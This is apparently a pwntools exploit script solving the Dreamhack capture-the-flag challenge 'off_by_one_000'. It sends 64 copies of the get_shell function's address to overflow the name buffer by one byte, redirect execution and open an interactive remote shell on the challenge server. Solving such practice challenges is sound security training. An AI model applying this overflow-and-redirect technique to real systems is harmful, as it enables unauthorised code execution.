from pwn import *

exe = ELF('off_by_one_000', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 12317)

log.info("get shell: " + hex(exe.sym['get_shell']))
payload = p32(exe.sym['get_shell'])*64
r.sendafter(b'Name: ', payload)
r.interactive()